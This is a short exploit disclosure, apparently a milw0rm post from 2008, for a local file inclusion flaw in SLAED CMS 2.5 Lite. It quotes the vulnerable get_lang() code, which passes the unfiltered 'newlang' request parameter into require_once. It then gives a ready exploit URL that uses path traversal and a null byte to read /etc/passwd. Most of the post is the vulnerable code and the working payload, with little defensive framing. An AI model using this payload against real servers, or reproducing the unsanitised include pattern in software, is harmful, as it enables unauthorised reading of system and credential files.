@@ -1,0 +1,30 @@
+# SLAED CMS 2.5 Lite Local file inclusion
+
+# Script url http://www.slaed.net/uploads/files/public/SLAED_CMS_2.5_Lite.zip
+
+# Lets code in function/sources.php: 
+ 
+780:  // Format language
+781:  function get_lang($module="") {
+782:	global $multilingual, $currentlang, $language, $user_cookie_t;
+783:	if (isset($_REQUEST['newlang']) && $multilingual == "1") {
+784:		if (file_exists("language/lang-".$_REQUEST['newlang'].".php")) {
+785:			setcookie("lang", $_REQUEST['newlang'], time() + intval($user_cookie_t));
+786:			require_once("language/lang-".$_REQUEST['newlang'].".php");
+                        ...
+
+And in index.php:
+9:    require_once("function/function.php");
+10:   get_lang();
+
+# As you can see variable newlang is not filtered, so, if magic_quotes_gpc turned off, we can use exploit:
+
+http://[targethost]/[path]/index.php?newlang=../../../../../../../../../../etc/passwd%00
+
+# Bug discovered by The_HuliGun
+
+# Greetz to: NaTka and all people who understand...
+
+# See u soon!
+
+# milw0rm.com [2008-01-23]
